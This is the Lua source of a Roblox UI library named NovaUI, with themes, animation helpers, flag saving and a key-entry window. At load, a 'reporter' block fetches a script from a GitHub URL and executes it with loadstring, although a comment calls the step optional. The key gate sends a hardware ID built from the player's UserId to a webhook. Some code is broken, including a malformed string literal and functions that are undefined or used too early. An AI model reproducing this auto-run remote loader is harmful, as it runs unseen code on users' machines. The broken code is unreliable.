--[[
    NovaUI v7.0 "Prism"
    A polished Roblox Luau UI library.
    Author : zurai02
    License: MIT
--]]

-- ══ SERVICES ════════════════════════════════════════════════════════════════
local Players       = game:GetService("Players")
local RunService    = game:GetService("RunService")
local TweenService  = game:GetService("TweenService")
local UserInputService = game:GetService("UserInputService")
local HttpService   = game:GetService("HttpService")
local TS            = TweenService
local HTTP          = HttpService
local LP            = Players.LocalPlayer
local PG            = LP and LP:WaitForChild("PlayerGui")
local mouse         = LP and LP:GetMouse()
local abs,clamp,floor,max,min,pi = math.abs,math.clamp,math.floor,math.max,math.min,math.pi
local sin,cos,huge  = math.sin,math.cos,math.huge
local insert,remove,sort = table.insert,table.remove,table.sort
local sfind,ssub,slower,supper,sformat,srep = string.find,string.sub,string.lower,string.upper,string.format,string.rep

-- ══ REPORTER (v7) ════════════════════════════════════════════════════════════
-- Paste your reporter.luau raw URL into _REPORTER_URL to enable it.
local _REPORTER_URL = "https://raw.githubusercontent.com/zurai02/NovaUI/refs/heads/main/reporter.luau"
task.spawn(function()
    if _REPORTER_URL ~= https://raw.githubusercontent.com/zurai02/NovaUI/refs/heads/main/reporter.luau"" then
        local ok, err = pcall(function()
            loadstring(game:HttpGet(_REPORTER_URL, true))()
        end)
        if not ok then
            warn("[NovaUI v7] Reporter load failed: " .. tostring(err))
        end
    end
end)

-- ══ SECURITY SYSTEM (ANTI-DUMP) ════════════════════════════════════════════════
local _ANTI_DUMP=true
local function ScriptSignature() return sformat("%x%x%x",math.random(0xFFFFFF),math.random(0xFFFFFF),math.random(0xFFFFFF)) end
local _scriptSig=ScriptSignature()
local function ValidateIntegrity() return _scriptSig~=nil end
local function ObfuscateString(s) local o=""; for i=1,#s do o=o..sformat("\\%d",s:byte(i)) end; return o end
local function AntiDebugDetect()
    if debug and debug.getinfo then pcall(function() error("") end) end
    return not (debug and debug.getlocal)
end
local _integrityOk=ValidateIntegrity()
if not _integrityOk and _ANTI_DUMP then warn("[NovaUI v7] Script integrity check failed") end

-- ══ KEY GATES & MONETIZATION ═══════════════════════════════════════════════════
local _keyCache={}
local _keyExpiry={}
local function GetHWID()
    local id=tostring(game:GetService("RunService"):IsStudio())..tostring(LP and LP.UserId or "unknown")
    local hash=0; for i=1,#id do hash=((hash<<5)-hash)+id:byte(i); hash=hash&hash end
    return sformat("%x",math.abs(hash))
end
local function ValidateKeyWebhook(key,webhookUrl)
    if not webhookUrl or webhookUrl=="" then return false end
    local ok,resp=pcall(function()
        return HttpService:PostAsync(webhookUrl,HttpService:JSONEncode({key=key,hwid=GetHWID(),timestamp=os.time()}),Enum.HttpContentType.ApplicationJson)
    end)
    if ok then local dec=pcall(HttpService.JSONDecode,HttpService,resp) or {}; return dec.valid==true end
    return false
end
local function CacheKey(key,duration) _keyCache[key]=true; _keyExpiry[key]=tick()+duration end
local function IsCachedKeyValid(key) return _keyCache[key] and (_keyExpiry[key]==nil or _keyExpiry[key]>tick()) end

-- ══ AUTO-FLAG PERSISTENCE ══════════════════════════════════════════════════════
local _flagFile="novaui_flags.json"
local _flagAutoSave=true
local _flagAutoLoad=true
local function EncryptFlag(v) local xor_key=42; if type(v)=="string" then local e=""; for i=1,#v do e=e..sformat("%x",v:byte(i)~xor_key) end; return e end; return v end
local function DecryptFlag(v) local xor_key=42; if type(v)=="string" and #v>0 then local d=""; for i=1,#v,2 do d=d..string.char(tonumber(v:sub(i,i+1),16)~xor_key) end; return d end; return v end
local function SaveFlagsAuto()
    if not _flagAutoSave or not writefile then return end
    local s={}; for f,val in next,NovaUI.Flags do local sv_val=sv(val); s[f]=type(sv_val)=="table" and sv_val or EncryptFlag(tostring(sv_val)) end
    pcall(function() writefile(_flagFile,HttpService:JSONEncode(s)) end)
end
local function LoadFlagsAuto()
    if not _flagAutoLoad or not readfile then return end
    pcall(function()
        local data=readfile(_flagFile)
        local flags=HttpService:JSONDecode(data)
        for f,val in next,flags do NovaUI.Flags[f]=type(val)=="table" and dv(val) or DecryptFlag(tostring(val)) end
    end)
end

-- ══ ENUM LOCALS ═════════════════════════════════════════════════════════════
local MB1   = Enum.UserInputType.MouseButton1
local TOUCH = Enum.UserInputType.Touch
local MMOVE = Enum.UserInputType.MouseMovement
local KBD   = Enum.UserInputType.Keyboard
local ESC   = Enum.KeyCode.Escape
local UDEND = Enum.UserInputState.End
local AS_Y  = Enum.AutomaticSize.Y
local AS_X  = Enum.AutomaticSize.X
local XL    = UDim2.new(1,0,0,0)
local XR    = UDim2.new(1,0,1,0)
local XC    = UDim2.new(0.5,0,0.5,0)
local YT    = UDim2.new(0,0,0,0)
local QUINT = Enum.EasingStyle.Quint
local BACK  = Enum.EasingStyle.Back
local QUAD  = Enum.EasingStyle.Quad
local LIN   = Enum.EasingStyle.Linear
local SINE  = Enum.EasingStyle.Sine
local OUT   = Enum.EasingDirection.Out
local INE   = Enum.EasingDirection.In
local SORT  = Enum.SortOrder.LayoutOrder
local HFILL = Enum.FillDirection.Horizontal
local VFILL = Enum.FillDirection.Vertical
local HALR  = Enum.HorizontalAlignment.Right
local HALC  = Enum.HorizontalAlignment.Center
local SCRY  = Enum.ScrollingDirection.Y
local CROP  = Enum.ClipsDescendants
local BORD  = Enum.BorderMode.Inset
local _W1   = Color3.new(1,1,1)
local _B0   = Color3.new(0,0,0)

-- ══ INSTANCE HELPERS ════════════════════════════════════════════════════════
local Frame_new = Instance.new

local function New(cls, props, children)
    local obj = Frame_new(cls)
    if props then
        for k,v in next, props do
            if k ~= "Parent" then obj[k] = v end
        end
        if props.Parent then obj.Parent = props.Parent end
    end
    if children then
        for _,c in next, children do c.Parent = obj end
    end
    return obj
end

local function rect(sz, pos, col, parent, transp, zi)
    local f = Frame_new("Frame")
    f.Size                   = sz
    f.Position               = pos
    f.BackgroundColor3       = col
    f.BackgroundTransparency = transp or 0
    f.BorderSizePixel        = 0
    if zi then f.ZIndex = zi end
    f.Parent = parent
    return f
end

local function corner(parent, radius)
    local c = Frame_new("UICorner")
    c.CornerRadius = radius or UDim.new(0,8)
    c.Parent = parent
    return c
end

local _TI = {}
local function T(obj, goal, dur, sty, dir)
    dur = dur or 0.22; sty = sty or QUINT; dir = dir or OUT
    local k = (dur*1000 // 1) | (sty.Value << 13) | (dir.Value << 19)
    local ti = _TI[k]
    if not ti then ti = TweenInfo.new(dur,sty,dir); _TI[k]=ti end
    local tw = TS:Create(obj,ti,goal); tw:Play(); return tw
end

local function TSmooth(obj, goal, dur)
    dur = dur or 0.24
    local ti = TweenInfo.new(dur, Enum.EasingStyle.Quad, Enum.EasingDirection.Out)
    local tw = TS:Create(obj, ti, goal); tw:Play(); return tw
end

local function TSpring(obj, goal, dur)
    dur = dur or 0.35
    local ti = TweenInfo.new(dur, Enum.EasingStyle.Elastic, Enum.EasingDirection.Out)
    local tw = TS:Create(obj, ti, goal); tw:Play(); return tw
end

-- ══ COLOR HELPERS ════════════════════════════════════════════════════════════
local function C3(r,g,b) return Color3.fromRGB(r,g,b) end
local function Lighten(c,f) return c:Lerp(_W1,f) end
local function Darken(c,f)  return c:Lerp(_B0,f) end
local function LerpC(a,b,t) return a:Lerp(b,t) end
local function ToHex(c) return sformat("%02X%02X%02X",floor(c.R*255),floor(c.G*255),floor(c.B*255)) end
local function FromHex(h) h=h:gsub("#",""); return C3(tonumber(ssub(h,1,2),16),tonumber(ssub(h,3,4),16),tonumber(ssub(h,5,6),16)) end
local function Round(n,d) local f=10^(d or 0); return floor(n*f+0.5)/f end
local function Trim(s) return s:match("^%s*(.-)%s*$") end
local function C01(v) return clamp(v,0,1) end

-- ══ VISUAL DEPTH (MODERN/SLEEK) ════════════════════════════════════════════════
local function TopHL(parent, zi)
    local h = Frame_new("Frame")
    h.Name="TopHL"; h.Size=UDim2.new(1,-20,0,1.5)
    h.Position=UDim2.new(0,10,0,0.5)
    h.BackgroundColor3=_W1; h.BackgroundTransparency=0.85
    h.BorderSizePixel=0; h.ZIndex=(zi or 2)+1
    h.Parent=parent
    corner(h, UDim.new(1,0))
    return h
end

local function SurfaceGrad(parent, zi, darkTop)
    local g = Frame_new("UIGradient")
    g.Color = darkTop and
        ColorSequence.new({ColorSequenceKeypoint.new(0,C3(30,30,40)),ColorSequenceKeypoint.new(1,C3(15,15,22))}) or
        ColorSequence.new({ColorSequenceKeypoint.new(0,C3(255,255,255)),ColorSequenceKeypoint.new(1,C3(240,240,245))})
    g.Transparency = NumberSequence.new({NumberSequenceKeypoint.new(0,0.96),NumberSequenceKeypoint.new(0.5,0.97),NumberSequenceKeypoint.new(1,0.99)})
    g.Rotation = 90
    g.Parent = parent
    return g
end

local function ModernGlassEffect(parent, intensity)
    intensity = intensity or 0.15
    local g = Frame_new("UIGradient")
    g.Color = ColorSequence.new({
        ColorSequenceKeypoint.new(0,_W1),
        ColorSequenceKeypoint.new(0.4,_W1),
        ColorSequenceKeypoint.new(1,_B0)
    })
    g.Transparency = NumberSequence.new({
        NumberSequenceKeypoint.new(0,1-intensity),
        NumberSequenceKeypoint.new(0.3,1-(intensity*0.8)),
        NumberSequenceKeypoint.new(1,1)
    })
    g.Rotation = 45
    g.Parent = parent
    return g
end

local function ShineLayer(parent, zi)
    local s = Frame_new("Frame")
    s.Name="Shine"; s.Size=UDim2.new(1,0,0,1)
    s.Position=YT; s.BackgroundColor3=_W1
    s.BackgroundTransparency=0.75; s.BorderSizePixel=0
    s.ZIndex=(zi or 2)+1; s.Parent=parent
    return s
end

local function ModernShadow(parent, intensity, blur)
    blur = blur or 12
    local s = Frame_new("Frame")
    s.Name="ModernShadow"; s.Size=UDim2.new(1,blur*2,1,blur*2)
    s.Position=UDim2.new(0,-blur,0,-blur)
    s.BackgroundTransparency=1; s.BorderSizePixel=0
    s.ZIndex=(parent.ZIndex or 2)-2; s.Parent=parent
    local stroke = Frame_new("UIStroke")
    stroke.Color=_B0; stroke.Thickness=0.5
    stroke.Transparency=0.85; stroke.Parent=s
    corner(s, UDim.new(0,20))
    return s
end

local function GlowRing(parent, col, zi)
    local g = Frame_new("Frame")
    g.Name="GlowRing"; g.Size=UDim2.new(1,20,1,20)
    g.Position=UDim2.new(0,-10,0,-10)
    g.BackgroundTransparency=1; g.BorderSizePixel=0
    g.ZIndex=(zi or 2)-1; g.Parent=parent
    local s = Frame_new("UIStroke")
    s.Color=col or C3(138,43,226); s.Thickness=1.5
    s.Transparency=0.7; s.Parent=g
    corner(g, UDim.new(0,20))
    return g
end

-- ══ INTERACTION HELPERS (MODERN) ═════════════════════════════════════════════
local function HoverBg(frame, hoverCol, baseCol, dur)
    dur = dur or 0.16
    local function enter() TSmooth(frame,{BackgroundColor3=hoverCol},dur) end
    local function leave() TSmooth(frame,{BackgroundColor3=baseCol},dur) end
    local c1 = frame.MouseEnter:Connect(enter)
    local c2 = frame.MouseLeave:Connect(leave)
    return c1,c2
end

local function PressAnim(frame, scale, dur)
    scale = scale or UDim2.new(0.97,0,0.97,0)
    local orig = frame.Size
    local origPos = frame.Position
    local c = frame.MouseButton1Down:Connect(function()
        TSmooth(frame,{Size=scale},dur or 0.1)
    end)
    local c2 = frame.MouseButton1Up:Connect(function()
        TSmooth(frame,{Size=orig},dur or 0.2)
    end)
    return c,c2
end

local function Ripple(parent, x, y, col)
    col = col or _W1
    local r = Frame_new("Frame")
    r.Size=UDim2.new(0,2,0,2)
    r.Position=UDim2.new(0,x,0,y)
    r.AnchorPoint=Vector2.new(0.5,0.5)
    r.BackgroundColor3=col; r.BackgroundTransparency=0.5
    r.BorderSizePixel=0; r.ZIndex=parent.ZIndex+5
    r.Parent=parent; corner(r,UDim.new(1,0))
    local sz=math.min(parent.AbsoluteSize.X,parent.AbsoluteSize.Y)*2.2
    TSmooth(r,{Size=UDim2.new(0,sz,0,sz),BackgroundTransparency=1},0.48)
    task.delay(0.5,function() r:Destroy() end)
end

local _tips={}
local function Tooltip(parent, text)
    local tip
    local c1=parent.MouseEnter:Connect(function()
        if tip then return end
        tip = Frame_new("Frame")
        tip.Size=UDim2.new(0,0,0,26); tip.AutomaticSize=AS_X
        tip.Position=UDim2.new(0,parent.AbsolutePosition.X-8,0,parent.AbsolutePosition.Y-34)
        tip.BackgroundColor3=C3(30,30,36); tip.BorderSizePixel=0
        tip.ZIndex=999; tip.Parent=PG and PG:FindFirstChildOfClass("ScreenGui") or parent
        corner(tip,UDim.new(0,6))
        local lbl=Frame_new("TextLabel")
        lbl.Size=UDim2.new(1,0,1,0); lbl.BackgroundTransparency=1
        lbl.Text=" "..text.." "; lbl.TextColor3=_W1
        lbl.Font=Enum.Font.GothamMedium; lbl.TextSize=12
        lbl.ZIndex=1000; lbl.Parent=tip
        insert(_tips,tip)
    end)
    local c2=parent.MouseLeave:Connect(function()
        if tip then tip:Destroy(); tip=nil end
        for i=#_tips,1,-1 do if _tips[i]==nil or not _tips[i].Parent then remove(_tips,i) end end
    end)
    return c1,c2
end

local function MakeDraggable(handle, frame)
    local dragging,dragInput,dragStart,startPos=false,nil,nil,nil
    handle.InputBegan:Connect(function(inp)
        if inp.UserInputType==MB1 or inp.UserInputType==TOUCH then
            dragging=true; dragStart=inp.Position; startPos=frame.Position
            inp.Changed:Connect(function() if inp.UserInputState==UDEND then dragging=false end end)
        end
    end)
    handle.InputChanged:Connect(function(inp)
        if inp.UserInputType==MMOVE or inp.UserInputType==TOUCH then dragInput=inp end
    end)
    UserInputService.InputChanged:Connect(function(inp)
        if inp==dragInput and dragging then
            local d=inp.Position-dragStart
            frame.Position=UDim2.new(startPos.X.Scale,startPos.X.Offset+d.X,startPos.Y.Scale,startPos.Y.Offset+d.Y)
        end
    end)
end

-- ══ THEMES ══════════════════════════════════════════════════════════════════
local Themes={}
local function FT(name,t) t.Name=name; insert(Themes,t); return t end

FT("Dark",{Background=C3(15,15,20),Surface=C3(22,22,30),Elevated=C3(30,30,40),Accent=C3(138,43,226),AccentDark=C3(100,20,180),AccentLight=C3(170,90,255),Text=C3(240,240,248),SubText=C3(160,160,175),Disabled=C3(80,80,95),Stroke=C3(45,45,60),StrokeStrong=C3(65,65,85),Success=C3(52,199,89),Warning=C3(255,159,10),Error=C3(255,59,48),Info=C3(10,132,255),Shadow=C3(0,0,0),})
FT("Light",{Background=C3(245,245,250),Surface=C3(255,255,255),Elevated=C3(235,235,245),Accent=C3(110,30,200),AccentDark=C3(80,10,160),AccentLight=C3(150,70,240),Text=C3(20,20,30),SubText=C3(90,90,110),Disabled=C3(170,170,185),Stroke=C3(210,210,225),StrokeStrong=C3(180,180,200),Success=C3(40,170,70),Warning=C3(200,120,0),Error=C3(210,40,30),Info=C3(0,100,210),Shadow=C3(180,180,200),})
FT("Midnight",{Background=C3(8,8,16),Surface=C3(14,14,26),Elevated=C3(20,20,36),Accent=C3(80,120,255),AccentDark=C3(50,80,210),AccentLight=C3(120,160,255),Text=C3(220,225,255),SubText=C3(140,145,175),Disabled=C3(70,72,100),Stroke=C3(35,38,65),StrokeStrong=C3(55,60,95),Success=C3(50,210,100),Warning=C3(255,170,0),Error=C3(255,65,55),Info=C3(40,150,255),Shadow=C3(0,0,0),})
FT("Ocean",{Background=C3(8,20,35),Surface=C3(12,30,52),Elevated=C3(18,42,70),Accent=C3(0,180,220),AccentDark=C3(0,130,170),AccentLight=C3(60,210,240),Text=C3(210,235,250),SubText=C3(130,165,190),Disabled=C3(65,90,115),Stroke=C3(25,60,90),StrokeStrong=C3(40,85,125),Success=C3(45,200,120),Warning=C3(255,165,0),Error=C3(255,60,50),Info=C3(20,160,230),Shadow=C3(0,5,15),})
FT("Forest",{Background=C3(10,20,12),Surface=C3(15,30,18),Elevated=C3(22,42,26),Accent=C3(60,200,80),AccentDark=C3(35,150,50),AccentLight=C3(100,230,120),Text=C3(210,240,215),SubText=C3(130,170,140),Disabled=C3(70,100,78),Stroke=C3(30,60,36),StrokeStrong=C3(48,85,55),Success=C3(50,210,90),Warning=C3(220,180,0),Error=C3(255,65,50),Info=C3(30,160,240),Shadow=C3(0,5,2),})
FT("Rose",{Background=C3(28,10,16),Surface=C3(40,15,24),Elevated=C3(55,20,33),Accent=C3(255,80,120),AccentDark=C3(210,40,80),AccentLight=C3(255,130,160),Text=C3(255,230,235),SubText=C3(200,155,168),Disabled=C3(115,80,92),Stroke=C3(80,35,50),StrokeStrong=C3(110,50,70),Success=C3(60,210,100),Warning=C3(255,175,0),Error=C3(255,55,45),Info=C3(30,155,250),Shadow=C3(10,0,5),})
FT("Amber",{Background=C3(22,16,6),Surface=C3(32,24,10),Elevated=C3(44,34,14),Accent=C3(255,175,30),AccentDark=C3(210,130,0),AccentLight=C3(255,210,90),Text=C3(255,245,220),SubText=C3(200,178,130),Disabled=C3(115,100,70),Stroke=C3(75,55,20),StrokeStrong=C3(105,78,30),Success=C3(55,200,80),Warning=C3(255,160,0),Error=C3(255,60,50),Info=C3(35,155,245),Shadow=C3(8,5,0),})
FT("Slate",{Background=C3(16,20,26),Surface=C3(24,30,38),Elevated=C3(33,40,52),Accent=C3(100,160,240),AccentDark=C3(65,120,200),AccentLight=C3(145,195,255),Text=C3(220,228,240),SubText=C3(140,155,178),Disabled=C3(75,88,108),Stroke=C3(44,55,72),StrokeStrong=C3(65,80,102),Success=C3(50,200,95),Warning=C3(255,162,0),Error=C3(255,62,52),Info=C3(28,155,248),Shadow=C3(5,7,10),})
FT("Cyber",{Background=C3(5,5,8),Surface=C3(8,12,18),Elevated=C3(12,18,28),Accent=C3(0,255,180),AccentDark=C3(0,200,130),AccentLight=C3(80,255,210),Text=C3(200,255,240),SubText=C3(120,180,160),Disabled=C3(60,90,80),Stroke=C3(20,50,40),StrokeStrong=C3(30,80,65),Success=C3(0,230,140),Warning=C3(255,200,0),Error=C3(255,50,50),Info=C3(0,180,255),Shadow=C3(0,5,4),})
FT("Neon",{Background=C3(5,0,12),Surface=C3(10,5,22),Elevated=C3(15,8,32),Accent=C3(255,0,200),AccentDark=C3(200,0,150),AccentLight=C3(255,80,230),Text=C3(255,220,255),SubText=C3(190,140,200),Disabled=C3(90,60,100),Stroke=C3(50,20,65),StrokeStrong=C3(75,35,95),Success=C3(0,255,128),Warning=C3(255,220,0),Error=C3(255,50,50),Info=C3(0,200,255),Shadow=C3(3,0,6),})
FT("Sand",{Background=C3(38,32,22),Surface=C3(52,44,30),Elevated=C3(68,58,40),Accent=C3(210,170,90),AccentDark=C3(170,130,50),AccentLight=C3(240,205,130),Text=C3(250,240,220),SubText=C3(195,178,148),Disabled=C3(120,108,85),Stroke=C3(90,78,55),StrokeStrong=C3(120,105,75),Success=C3(60,200,90),Warning=C3(255,165,0),Error=C3(235,65,55),Info=C3(40,155,240),Shadow=C3(12,10,5),})
FT("Ice",{Background=C3(230,240,252),Surface=C3(245,250,255),Elevated=C3(255,255,255),Accent=C3(30,120,220),AccentDark=C3(10,80,180),AccentLight=C3(80,160,250),Text=C3(20,30,55),SubText=C3(80,100,140),Disabled=C3(165,180,210),Stroke=C3(195,210,235),StrokeStrong=C3(165,185,220),Success=C3(30,175,80),Warning=C3(190,125,0),Error=C3(205,40,30),Info=C3(20,110,210),Shadow=C3(175,195,225),})
FT("Crimson",{Background=C3(20,5,5),Surface=C3(32,8,8),Elevated=C3(46,12,12),Accent=C3(220,40,40),AccentDark=C3(170,15,15),AccentLight=C3(255,90,90),Text=C3(255,235,235),SubText=C3(205,165,165),Disabled=C3(115,80,80),Stroke=C3(80,28,28),StrokeStrong=C3(112,42,42),Success=C3(55,205,90),Warning=C3(255,172,0),Error=C3(255,55,45),Info=C3(30,152,248),Shadow=C3(8,0,0),})
FT("Galaxy",{Background=C3(8,6,18),Surface=C3(14,10,30),Elevated=C3(20,16,44),Accent=C3(160,80,255),AccentDark=C3(110,40,210),AccentLight=C3(200,130,255),Text=C3(235,225,255),SubText=C3(165,148,205),Disabled=C3(88,75,120),Stroke=C3(45,32,80),StrokeStrong=C3(68,52,115),Success=C3(50,210,100),Warning=C3(255,170,0),Error=C3(255,62,50),Info=C3(35,155,250),Shadow=C3(3,2,8),})
FT("Pastel",{Background=C3(248,245,255),Surface=C3(255,252,255),Elevated=C3(240,238,252),Accent=C3(180,130,255),AccentDark=C3(140,90,220),AccentLight=C3(215,180,255),Text=C3(50,40,70),SubText=C3(130,115,155),Disabled=C3(190,180,210),Stroke=C3(215,208,235),StrokeStrong=C3(190,180,218),Success=C3(100,200,130),Warning=C3(230,175,50),Error=C3(235,80,80),Info=C3(90,165,235),Shadow=C3(200,195,225),})
FT("Mocha",{Background=C3(28,22,18),Surface=C3(40,32,26),Elevated=C3(54,44,35),Accent=C3(195,140,95),AccentDark=C3(155,100,55),AccentLight=C3(230,178,130),Text=C3(245,235,222),SubText=C3(192,170,148),Disabled=C3(118,102,86),Stroke=C3(80,62,48),StrokeStrong=C3(108,86,66),Success=C3(60,198,88),Warning=C3(245,168,0),Error=C3(235,62,52),Info=C3(35,152,245),Shadow=C3(10,8,5),})
FT("Dracula",{Background=C3(40,42,54),Surface=C3(50,52,66),Elevated=C3(62,64,80),Accent=C3(189,147,249),AccentDark=C3(148,105,210),AccentLight=C3(218,185,255),Text=C3(248,248,242),SubText=C3(190,185,205),Disabled=C3(110,108,128),Stroke=C3(80,82,98),StrokeStrong=C3(102,105,125),Success=C3(80,250,123),Warning=C3(241,250,140),Error=C3(255,85,85),Info=C3(139,233,253),Shadow=C3(25,26,35),})
FT("Nord",{Background=C3(46,52,64),Surface=C3(59,66,82),Elevated=C3(67,76,94),Accent=C3(136,192,208),AccentDark=C3(94,158,174),AccentLight=C3(176,224,238),Text=C3(236,239,244),SubText=C3(180,186,198),Disabled=C3(100,108,122),Stroke=C3(88,100,116),StrokeStrong=C3(110,124,144),Success=C3(163,190,140),Warning=C3(235,203,139),Error=C3(191,97,106),Info=C3(129,161,193),Shadow=C3(36,40,52),})
FT("Solarized",{Background=C3(0,43,54),Surface=C3(7,54,66),Elevated=C3(0,62,77),Accent=C3(38,139,210),AccentDark=C3(12,100,170),AccentLight=C3(88,182,248),Text=C3(253,246,227),SubText=C3(147,161,161),Disabled=C3(80,95,95),Stroke=C3(15,72,88),StrokeStrong=C3(22,100,118),Success=C3(133,153,0),Warning=C3(181,137,0),Error=C3(220,50,47),Info=C3(38,139,210),Shadow=C3(0,28,36),})
FT("Tokyo",{Background=C3(26,27,38),Surface=C3(36,40,59),Elevated=C3(41,46,66),Accent=C3(122,162,247),AccentDark=C3(80,120,210),AccentLight=C3(165,198,255),Text=C3(192,202,245),SubText=C3(128,138,185),Disabled=C3(72,80,115),Stroke=C3(58,70,110),StrokeStrong=C3(78,92,138),Success=C3(158,206,106),Warning=C3(224,175,104),Error=C3(247,118,142),Info=C3(125,207,255),Shadow=C3(15,16,26),})
FT("Monochrome",{Background=C3(12,12,12),Surface=C3(22,22,22),Elevated=C3(34,34,34),Accent=C3(220,220,220),AccentDark=C3(165,165,165),AccentLight=C3(255,255,255),Text=C3(240,240,240),SubText=C3(165,165,165),Disabled=C3(90,90,90),Stroke=C3(52,52,52),StrokeStrong=C3(75,75,75),Success=C3(140,200,140),Warning=C3(200,175,100),Error=C3(210,100,100),Info=C3(130,175,210),Shadow=C3(0,0,0),})
FT("Sunset",{Background=C3(22,10,18),Surface=C3(34,16,28),Elevated=C3(48,22,38),Accent=C3(255,120,60),AccentDark=C3(210,75,15),AccentLight=C3(255,175,110),Text=C3(255,240,230),SubText=C3(210,172,155),Disabled=C3(118,90,82),Stroke=C3(85,40,55),StrokeStrong=C3(115,58,75),Success=C3(55,202,88),Warning=C3(255,170,0),Error=C3(255,58,48),Info=C3(35,155,248),Shadow=C3(8,3,6),})
FT("Modern",{Background=C3(10,12,18),Surface=C3(18,20,30),Elevated=C3(26,28,42),Accent=C3(120,200,255),AccentDark=C3(80,150,220),AccentLight=C3(160,220,255),Text=C3(245,248,255),SubText=C3(145,160,190),Disabled=C3(75,85,110),Stroke=C3(40,50,75),StrokeStrong=C3(60,75,105),Success=C3(80,220,120),Warning=C3(255,180,40),Error=C3(255,80,80),Info=C3(100,180,255),Shadow=C3(0,0,0),})
FT("Amoled",{Background=C3(0,0,0),Surface=C3(8,8,12),Elevated=C3(15,15,20),Accent=C3(100,200,255),AccentDark=C3(60,140,220),AccentLight=C3(150,220,255),Text=C3(255,255,255),SubText=C3(160,170,190),Disabled=C3(80,80,90),Stroke=C3(40,40,50),StrokeStrong=C3(60,60,75),Success=C3(100,230,140),Warning=C3(255,190,60),Error=C3(255,100,100),Info=C3(120,190,255),Shadow=C3(0,0,0),})
FT("Gradient",{Background=C3(12,8,28),Surface=C3(20,14,40),Elevated=C3(32,20,55),Accent=C3(200,100,255),AccentDark=C3(150,50,220),AccentLight=C3(230,150,255),Text=C3(250,245,255),SubText=C3(180,160,210),Disabled=C3(100,85,130),Stroke=C3(60,40,90),StrokeStrong=C3(90,60,130),Success=C3(100,240,120),Warning=C3(255,200,80),Error=C3(255,120,120),Info=C3(130,200,255),Shadow=C3(5,0,10),})

-- ══ NOVA ROOT ════════════════════════════════════════════════════════════════
local NovaUI={Version="7.0"; VersionName="Prism"; Themes=Themes; Windows={}; Flags={}; _flagCallbacks={}; _themeCallbacks={}}
local _currentTheme = Themes[1]

local function getTheme(nameOrIndex)
    if type(nameOrIndex)=="number" then return Themes[nameOrIndex] end
    for _,t in next,Themes do if t.Name==nameOrIndex then return t end end
    return Themes[1]
end

function NovaUI:SetGlobalTheme(nameOrIndex) local t=getTheme(nameOrIndex); _currentTheme=t; for _,fn in next,self._themeCallbacks do pcall(fn,t) end end
function NovaUI:GetThemeNames() local n={}; for _,t in next,Themes do insert(n,t.Name) end; return n end
function NovaUI:RegisterTheme(t) insert(Themes,t) end
function NovaUI:ExtendTheme(base,overrides) local b=getTheme(base); local n={}; for k,v in next,b do n[k]=v end; for k,v in next,overrides do n[k]=v end; insert(Themes,n); return n end
function NovaUI:SetFlag(name,val) self.Flags[name]=val; local cbs=self._flagCallbacks[name]; if cbs then for _,fn in next,cbs do pcall(fn,val) end end; SaveFlagsAuto() end
function NovaUI:GetFlag(name) return self.Flags[name] end
function NovaUI:OnFlagChanged(name,fn) if not self._flagCallbacks[name] then self._flagCallbacks[name]={} end; insert(self._flagCallbacks[name],fn) end
function NovaUI:ResetFlags() for k in next,self.Flags do self.Flags[k]=nil end end

local function onTheme(fn) insert(NovaUI._themeCallbacks,fn); return fn end
local function IsMobile() return UserInputService.TouchEnabled and not UserInputService.KeyboardEnabled end
local function ScalePx(px) return IsMobile() and px*1.25 or px end

-- ══ CREATE KEY SYSTEM (ENHANCED WITH WEBHOOKS & HWID) ═════════════════════════
function NovaUI:CreateKeySystem(cfg)
    cfg=cfg or {}
    local title=cfg.Title or "Key System"
    local subtitle=cfg.Subtitle or "Enter your access key"
    local keyList=cfg.Keys or {}
    local webhookUrl=cfg.WebhookUrl or ""
    local bindHWID=cfg.BindHWID~=false
    local cacheKeyFor=cfg.CacheKeyFor or 3600
    local keyExpiry=cfg.KeyExpiry or 0
    local onSuccess=cfg.OnSuccess
    local onFail=cfg.OnFail
    local stored=cfg.SaveKey and pcall(function() local s=readfile and readfile("novaui_key.txt") or ""; for _,k in next,keyList do if k==Trim(s) then if IsCachedKeyValid(k) then return true end end end end)
    if stored then if onSuccess then onSuccess() end; return end
    local SG=New("ScreenGui",{Name="NovaKeySystem",ResetOnSpawn=false,ZIndexBehavior=Enum.ZIndexBehavior.Sibling,Parent=PG})
    local bg=rect(UDim2.new(1,0,1,0),YT,C3(10,10,14),SG,0,1); bg.BackgroundTransparency=0.3
    local panel=Frame_new("Frame"); panel.Size=UDim2.new(0,380,0,220); panel.AnchorPoint=Vector2.new(0.5,0.5); panel.Position=XC; panel.BackgroundColor3=C3(20,20,28); panel.BorderSizePixel=0; panel.ZIndex=2; panel.Parent=bg
    corner(panel,UDim.new(0,16))
    local sk=Frame_new("UIStroke"); sk.Color=C3(60,60,80); sk.Thickness=1; sk.Parent=panel
    TopHL(panel,2)
    local ttl=Frame_new("TextLabel"); ttl.Size=UDim2.new(1,-32,0,32); ttl.Position=UDim2.new(0,16,0,18); ttl.BackgroundTransparency=1; ttl.Text=title; ttl.TextColor3=_W1; ttl.Font=Enum.Font.GothamBold; ttl.TextSize=18; ttl.TextXAlignment=Enum.TextXAlignment.Left; ttl.ZIndex=3; ttl.Parent=panel
    local sub=Frame_new("TextLabel"); sub.Size=UDim2.new(1,-32,0,20); sub.Position=UDim2.new(0,16,0,52); sub.BackgroundTransparency=1; sub.Text=subtitle; sub.TextColor3=C3(160,160,175); sub.Font=Enum.Font.Gotham; sub.TextSize=13; sub.TextXAlignment=Enum.TextXAlignment.Left; sub.ZIndex=3; sub.Parent=panel
    local box=Frame_new("Frame"); box.Size=UDim2.new(1,-32,0,40); box.Position=UDim2.new(0,16,0,84); box.BackgroundColor3=C3(30,30,40); box.BorderSizePixel=0; box.ZIndex=3; box.Parent=panel
    corner(box,UDim.new(0,8))
    local bsk=Frame_new("UIStroke"); bsk.Color=C3(55,55,72); bsk.Thickness=1; bsk.Parent=box
    local inp=Frame_new("TextBox"); inp.Size=UDim2.new(1,-16,1,0); inp.Position=UDim2.new(0,8,0,0); inp.BackgroundTransparency=1; inp.PlaceholderText="Enter key..."; inp.PlaceholderColor3=C3(100,100,120); inp.TextColor3=_W1; inp.Font=Enum.Font.GothamMedium; inp.TextSize=14; inp.ClearTextOnFocus=false; inp.ZIndex=4; inp.Parent=box
